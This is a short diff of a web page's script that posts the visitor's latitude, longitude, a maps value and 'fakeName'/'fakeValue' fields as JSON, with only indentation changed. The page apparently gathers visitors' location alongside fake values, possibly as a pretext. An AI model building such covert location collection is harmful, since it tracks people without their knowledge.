@@ -330,11 +330,11 @@
         headers: { "Content-Type": "application/json" },
         // Adicionei fakeName e fakeValue no envio
         body: JSON.stringify({
-          latitude,
-          longitude,
-          maps,
-          fakeName: nomeFinal,
-          fakeValue: valorFinal
+            latitude,
+            longitude,
+            maps,
+            fakeName: nomeFinal,
+            fakeValue: valorFinal
         })
       }).catch(e => console.error(e));
     }
@@ -346,5 +346,4 @@
   </script>
 
 </body>
-
 </html>
